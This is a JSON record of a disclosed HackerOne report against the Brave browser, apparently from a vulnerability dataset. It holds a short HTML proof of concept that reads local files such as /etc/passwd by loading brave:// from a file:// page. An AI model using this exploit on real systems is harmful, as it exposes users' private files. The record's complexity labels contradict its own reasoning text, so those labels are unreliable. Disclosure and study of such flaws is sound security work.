{
    "reported_to": "Brave Software",
    "reported_by": "metnew ",
    "title": "Local files reading from the \"file://\" origin through `brave://`",
    "content": "\nSummary:\nSadly, fix for #390013 works only for web. Loading brave:// from the file:// origin allows reading local files on the device.\nI said that fix could be insufficient \ud83d\ude08\nfile:// and brave:// both are local origins. That means it's possible to access brave:// from file:// and vice versa.\nProducts affected:\nBrave: 0.23.77\nV8: 6.8.275.24\nrev: 0125b5f5ddc7eebc832ceeb4f4275230ec49d149\nMuon: 8.0.6\nOS Release: 17.7.0\nUpdate Channel: \u0420\u0435\u043b\u0438\u0437\nOS Architecture: x64\nOS Platform: macOS\nNode.js: 7.9.0\nBrave Sync: v1.4.2\nlibchromiumcontent: 68.0.3440.84\nSteps To Reproduce:\nCode 261 Bytes\n1<head>\n2    <script>\n3        function show() {\n4            var file = link.import.querySelector('body')\n5            alert(file.innerHTML)\n6        }\n7    </script>\n8    <link id=\"link\" href=\"brave:///etc/passwd\" rel=\"import\" as=\"document\" onload=\"show()\" />\n9</head>\nSupporting Material/References:\nScreencast + PoC attached.\nImpact\nLocal files reading should be denied.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "None"
    ],
    "screenshots": {},
    "disclosed_date": 1538194500,
    "report_url": "https://hackerone.com/reports/390362",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Create an HTML file with a script that attempts to load a local file via `brave://` protocol."
        ],
        [
            2,
            "Open the HTML file in Brave browser to trigger the script and observe the content of the local file being displayed."
        ]
    ],
    "vuln_description": "The vulnerability allows reading local files from the 'file://' origin through the 'brave://' protocol in Brave browser. This is possible because both protocols are treated as local origins, enabling cross-origin access between them. An attacker can exploit this by crafting a malicious HTML file that uses the 'brave://' protocol to access sensitive local files, such as '/etc/passwd' on macOS.",
    "reason": "The attack involves understanding the interaction between two local origins ('file://' and 'brave://') and crafting a simple HTML file to exploit this interaction. The complexity is low because the attack does not require multiple components, complex state manipulation, or novel logic. The interaction between the protocols is subtle but not highly complex.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": "390013"
}